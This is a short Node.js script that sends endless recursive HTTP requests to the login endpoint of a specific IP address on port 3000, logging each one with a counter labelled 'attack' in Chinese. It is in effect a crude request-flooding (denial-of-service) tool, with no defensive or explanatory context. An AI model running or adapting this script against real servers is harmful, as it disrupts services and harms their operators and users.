var request = require('request');
var i = 1;

    
    function ab(a){
      request('http://115.159.209.148:3000/login',function(err,res){
        console.log('攻击'+i+'次'+res);
        i++;
        ab(a)
    })  
    }
 
 var a = 1
if(a>0){
    ab(ab())
}

    function ac(a){
      request('http://115.159.209.148:3000/login',function(err,res){
        console.log('攻击'+i+'次ok'+res);
        i++;
        ac(a)
    })  
    }
 
 var a = 1
if(a>0){
    ac(ac())
}
